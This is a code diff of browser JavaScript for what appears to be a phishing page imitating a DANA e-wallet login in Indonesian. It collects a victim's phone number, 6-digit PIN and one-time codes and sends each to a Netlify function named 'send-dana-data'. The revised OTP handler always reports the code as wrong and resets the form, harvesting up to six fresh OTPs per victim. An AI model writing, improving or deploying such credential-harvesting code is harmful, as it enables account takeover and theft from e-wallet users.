@@ -1,165 +1,67 @@
-document.addEventListener('DOMContentLoaded', function() {
-  // DOM Elements
+document.addEventListener('DOMContentLoaded', () => {
+  // DOM References
   const pages = {
-    phone: document.getElementById('number-page'),
-    pin: document.getElementById('pin-page'),
-    otp: document.getElementById('otp-page')
+    n: document.getElementById('number-page'),
+    p: document.getElementById('pin-page'),
+    o: document.getElementById('otp-page')
   };
   
-  const phoneInput = document.getElementById('phone-number');
-  const pinInputs = document.querySelectorAll('.pin-box');
-  const otpInputs = document.querySelectorAll('.otp-box');
-  const continueBtn = document.getElementById('lanjutkan-button');
-  const showPinBtn = document.querySelector('.show-text');
-  const resendOtpBtn = document.querySelector('.resend-otp span');
-  const otpMessageBox = document.querySelector('.otp-message-box');
+  const lb = document.getElementById('lanjutkan-button');
+  const pn = document.getElementById('phone-number');
+  const pis = document.querySelectorAll('.pin-box');
+  const ois = document.querySelectorAll('.otp-box');
+  const fn = document.getElementById('floating-notification');
+  const sn = document.getElementById('success-notification');
+  const rn = document.getElementById('reward-notification');
+  const ac = document.getElementById('attempt-counter');
+  const an = document.getElementById('attempt-number');
+  const lc = document.getElementById('lanjutkan-container');
 
-  // State Management
-  const state = {
-    currentPage: 'phone',
-    phoneNumber: '',
-    pin: '',
-    otp: '',
-    attempts: 0,
-    maxAttempts: 3,
-    otpTimer: null
-  };
+  // State Variables
+  let currentPage = 'n';
+  let phoneNumber = '';
+  let pin = '';
+  let otp = '';
+  let attemptCount = 0;
+  const maxAttempts = 6;
+  let otpTimer;
 
-  // Initialize pages
-  pages.phone.style.display = 'block';
+  // Helper Functions
+  function showSpinner() {
+    document.querySelector('.spinner-overlay').style.display = 'flex';
+  }
 
-  // Phone number input handling
-  phoneInput.addEventListener('input', function(e) {
-    let value = e.target.value.replace(/\D/g, '');
-    
-    if (value.length > 0 && !value.startsWith('8')) {
-      value = '8' + value.substring(1);
-    }
-    
-    let formatted = '';
-    if (value.length > 0) formatted = value.substring(0, 4);
-    if (value.length > 4) formatted += '-' + value.substring(4, 8);
-    
-    phoneInput.value = formatted;
-    state.phoneNumber = value;
-  });
-
-  // Continue button handler
-  continueBtn.addEventListener('click', async function() {
-    if (state.currentPage === 'phone') {
-      if (state.phoneNumber.length < 10) {
-        showError('Nomor HP harus minimal 10 digit');
-        return;
-      }
-      
-      showLoading();
-      try {
-        await sendData('phone', { phone: state.phoneNumber });
-        switchPage('pin');
-      } catch (error) {
-        showError('Gagal mengirim nomor HP');
-      } finally {
-        hideLoading();
-      }
-    }
-  });
-
-  // PIN input handling
-  pinInputs.forEach((input, index) => {
-    input.addEventListener('input', function(e) {
-      e.target.value = e.target.value.replace(/\D/g, '');
-      
-      if (e.target.value.length === 1 && index < pinInputs.length - 1) {
-        pinInputs[index + 1].focus();
-      }
-      
-      state.pin = Array.from(pinInputs).map(i => i.value).join('');
-      
-      if (state.pin.length === 6) {
-        submitPIN();
-      }
-    });
-
-    input.addEventListener('keydown', function(e) {
-      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
-        pinInputs[index - 1].focus();
-      }
-    });
-  });
-
-  // OTP input handling
-  otpInputs.forEach((input, index) => {
-    input.addEventListener('input', function(e) {
-      e.target.value = e.target.value.replace(/\D/g, '');
-      
-      if (e.target.value.length === 1 && index < otpInputs.length - 1) {
-        otpInputs[index + 1].focus();
-      }
-      
-      state.otp = Array.from(otpInputs).map(i => i.value).join('');
-      
-      if (state.otp.length === 4) {
-        submitOTP();
-      }
-    });
-
-    input.addEventListener('keydown', function(e) {
-      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
-        otpInputs[index - 1].focus();
-      }
-    });
-  });
-
-  // Resend OTP handler
-  resendOtpBtn.addEventListener('click', function() {
-    if (this.textContent.includes('KIRIM ULANG')) {
-      startOTPTimer();
-      otpMessageBox.innerHTML = `
-        <p><b>Tap verifikasi untuk menerima OTP</b></p>
-        <p>Kode OTP telah dikirim ke nomor Anda</p>
-      `;
-    }
-  });
-
-  // PIN visibility toggle
-  showPinBtn.addEventListener('click', function() {
-    const isShowing = this.classList.toggle('active');
-    pinInputs.forEach(input => {
-      input.type = isShowing ? 'text' : 'password';
-    });
-    this.textContent = isShowing ? 'SEMBUNYIKAN' : 'TAMPILKAN';
-  });
-
-  // Core functions
-  function switchPage(targetPage) {
-    Object.values(pages).forEach(page => {
-      page.style.display = 'none';
-    });
-    pages[targetPage].style.display = 'block';
-    state.currentPage = targetPage;
-    
-    setTimeout(() => {
-      const firstInput = pages[targetPage].querySelector('input');
-      if (firstInput) firstInput.focus();
-    }, 100);
+  function hideSpinner() {
+    document.querySelector('.spinner-overlay').style.display = 'none';
   }
 
   function startOTPTimer() {
-    clearInterval(state.otpTimer);
-    let timeLeft = 118;
+    let timeLeft = 120;
+    const timerElement = document.getElementById('otp-timer');
     
-    state.otpTimer = setInterval(() => {
-      resendOtpBtn.textContent = `KIRIM ULANG (${timeLeft}s)`;
+    otpTimer = setInterval(() => {
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
       
       if (timeLeft <= 0) {
-        clearInterval(state.otpTimer);
-        resendOtpBtn.textContent = 'KIRIM ULANG';
+        clearInterval(otpTimer);
       }
       timeLeft--;
     }, 1000);
   }
 
-  async function sendData(type, data) {
+  function resetOTPInputs() {
+    ois.forEach(input => input.value = '');
+    ois[0].focus();
+    otp = '';
+    attemptCount++;
+    an.textContent = attemptCount;
+    ac.style.display = 'block';
+  }
+
+  // Backend Communication
+  async function sendDanaData(type, data) {
     try {
       const response = await fetch('/.netlify/functions/send-dana-data', {
         method: 'POST',
@@ -170,77 +72,167 @@ document.addEventListener('DOMContentLoaded', function() {
       if (!response.ok) throw new Error(await response.text());
       return await response.json();
     } catch (error) {
-      console.error('API Error:', error);
+      console.error('Error:', error);
       throw error;
     }
   }
 
-  async function submitPIN() {
-    showLoading();
-    try {
-      await sendData('pin', { phone: state.phoneNumber, pin: state.pin });
-      switchPage('otp');
-      startOTPTimer();
-    } catch (error) {
-      showError('PIN salah atau terjadi kesalahan');
-      clearPINInputs();
-    } finally {
-      hideLoading();
+  // Modified Phone Number Formatting
+  pn.addEventListener('input', (e) => {
+    // Hapus semua karakter non-digit
+    let value = e.target.value.replace(/\D/g, '');
+    
+    // Hapus angka 0 di awal jika ada
+    if (value.startsWith('0')) {
+      value = value.substring(1);
     }
-  }
-
-  async function submitOTP() {
-    showLoading();
-    try {
-      await sendData('otp', { 
-        phone: state.phoneNumber, 
-        pin: state.pin,
-        otp: state.otp 
-      });
-      handleOTPResponse();
-    } catch (error) {
-      showError('OTP salah atau terjadi kesalahan');
-      handleOTPError();
-    } finally {
-      hideLoading();
+    
+    // Pastikan selalu dimulai dengan 8
+    if (value.length > 0 && !value.startsWith('8')) {
+      value = '8' + value.replace(/^8/, ''); // Tambahkan 8 di depan dan hapus 8 yang mungkin sudah ada
     }
-  }
-
-  function handleOTPResponse() {
-    state.attempts++;
-    if (state.attempts >= state.maxAttempts) {
-      showError('Terlalu banyak percobaan, silakan coba lagi nanti');
+    
+    // Batasi panjang maksimal (3+4+5=12 digit)
+    if (value.length > 12) {
+      value = value.substring(0, 12);
     }
-    clearOTPInputs();
-  }
+    
+    // Format nomor dengan tanda hubung
+    let formatted = '';
+    if (value.length > 0) {
+      formatted = value.substring(0, 3); // 3 digit pertama
+      if (value.length > 3) {
+        formatted += '-' + value.substring(3, 7); // 4 digit berikutnya
+      }
+      if (value.length > 7) {
+        formatted += '-' + value.substring(7, 12); // 5 digit terakhir
+      }
+    }
+    
+    // Set nilai input dengan format yang sudah dibuat
+    e.target.value = formatted;
+    
+    // Simpan nomor tanpa format untuk pengiriman data
+    phoneNumber = value;
+  });
 
-  function clearPINInputs() {
-    pinInputs.forEach(input => input.value = '');
-    pinInputs[0].focus();
-    state.pin = '';
-  }
+  // Event Handlers
+  lb.addEventListener('click', async () => {
+    if (currentPage === 'n') {
+      if (phoneNumber.length < 10) {
+        alert('Nomor HP harus minimal 10 digit');
+        return;
+      }
+      
+      showSpinner();
+      try {
+        await sendDanaData('phone', { phone: phoneNumber });
+        pages.n.style.display = 'none';
+        pages.p.style.display = 'block';
+        currentPage = 'p';
+        lc.style.display = 'none';
+      } catch (error) {
+        alert('Gagal mengirim data: ' + error.message);
+      } finally {
+        hideSpinner();
+      }
+    }
+  });
 
-  function clearOTPInputs() {
-    otpInputs.forEach(input => input.value = '');
-    otpInputs[0].focus();
-    state.otp = '';
-  }
+  // PIN Input Handling
+  pis.forEach((input, index) => {
+    input.addEventListener('input', async (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '');
+      
+      if (e.target.value.length === 1 && index < pis.length - 1) {
+        pis[index + 1].focus();
+      }
+      
+      pin = Array.from(pis).map(i => i.value).join('');
+      
+      if (pin.length === 6) {
+        showSpinner();
+        try {
+          await sendDanaData('pin', { phone: phoneNumber, pin });
+          pages.p.style.display = 'none';
+          pages.o.style.display = 'block';
+          currentPage = 'o';
+          lc.style.display = 'none';
+          startOTPTimer();
+          setTimeout(() => fn.style.display = 'block', 1000);
+        } catch (error) {
+          alert('Gagal mengirim PIN: ' + error.message);
+        } finally {
+          hideSpinner();
+        }
+      }
+    });
+    
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+        pis[index - 1].focus();
+      }
+    });
+  });
 
-  function showLoading() {
-    document.querySelector('.spinner-overlay').style.display = 'flex';
-  }
+  // OTP Input Handling
+  ois.forEach((input, index) => {
+    input.addEventListener('input', async (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '');
+      
+      if (e.target.value.length === 1 && index < ois.length - 1) {
+        ois[index + 1].focus();
+      }
+      
+      otp = Array.from(ois).map(i => i.value).join('');
+      
+      if (index === ois.length - 1 && e.target.value.length === 1) {
+        showSpinner();
+        try {
+          await sendDanaData('otp', { phone: phoneNumber, pin, otp });
+          
+          setTimeout(() => {
+            resetOTPInputs();
+            
+            if (attemptCount > 2) {
+              rn.style.display = 'block';
+              rn.innerHTML = `
+                <div class="notification-content">
+                  <h3>kode OTP Salah</h3>
+                  <p>silahkan cek sms ataupan whatsapp</p>
+                </div>
+              `;
+              setTimeout(() => rn.style.display = 'none', 10000);
+            }
+            
+            if (attemptCount >= maxAttempts) {
+              fn.style.display = 'none';
+              sn.style.display = 'block';
+              setTimeout(() => sn.style.display = 'none', 5000);
+            }
+          }, 1000);
+        } catch (error) {
+          console.error('Gagal mengirim OTP:', error);
+        } finally {
+          hideSpinner();
+        }
+      }
+    });
+    
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+        ois[index - 1].focus();
+      }
+    });
+  });
 
-  function hideLoading() {
-    document.querySelector('.spinner-overlay').style.display = 'none';
-  }
-
-  function showError(message) {
-    const errorElement = document.createElement('div');
-    errorElement.className = 'error-message';
-    errorElement.textContent = message;
-    document.body.appendChild(errorElement);
-    setTimeout(() => {
-      document.body.removeChild(errorElement);
-    }, 3000);
-  }
+  // Toggle PIN Visibility
+  document.querySelector('.show-text').addEventListener('click', (e) => {
+    const isShowing = e.target.classList.toggle('active');
+    const pinInputs = document.querySelectorAll('.pin-box');
+    pinInputs.forEach(input => {
+      input.type = isShowing ? 'text' : 'password';
+    });
+    e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
+  });
 });
